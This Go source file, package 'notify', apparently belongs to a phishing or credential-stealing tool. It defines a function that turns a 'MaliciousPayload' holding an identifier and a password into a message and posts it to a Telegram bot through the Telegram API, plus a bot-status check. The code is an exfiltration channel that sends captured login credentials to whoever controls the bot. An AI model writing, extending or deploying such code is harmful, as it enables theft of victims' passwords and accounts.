package notify

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func buildPayload(payload MaliciousPayload) *TelegramData {
	return &TelegramData{
		Identifier: payload.Identifier,
		Password:   payload.Password,
	}
}

// Main function for sending a payload to telegram.
func sendToTelegram(token string, chatId string, payload TelegramData) error {
	if token == "" || chatId == "" {
		return fmt.Errorf("missing token or chat id")
	}

	jsonBytes, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return err
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	data := map[string]string{
		"chat_id": chatId,
		"text":    string(jsonBytes),
	}

	body, err := json.Marshal(data)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send message, status: %s", resp.Status)
	}

	return nil
}

// Check if bot is online.
func getBotStatus(token string) (bool, error) {
	if token == "" {
		return false, fmt.Errorf("missing token or chat id")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/getMe", token)
	resp, err := http.Get(url)
	if err != nil {
		return true, err
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	var payload GetMeResponse
	err = json.Unmarshal(body, &payload)
	if err != nil {
		return false, err
	}

	return payload.Ok, nil
}

func handleStatusToString(rep bool) string {
	if rep {
		return "ok"
	} else {
		return "error"
	}
}
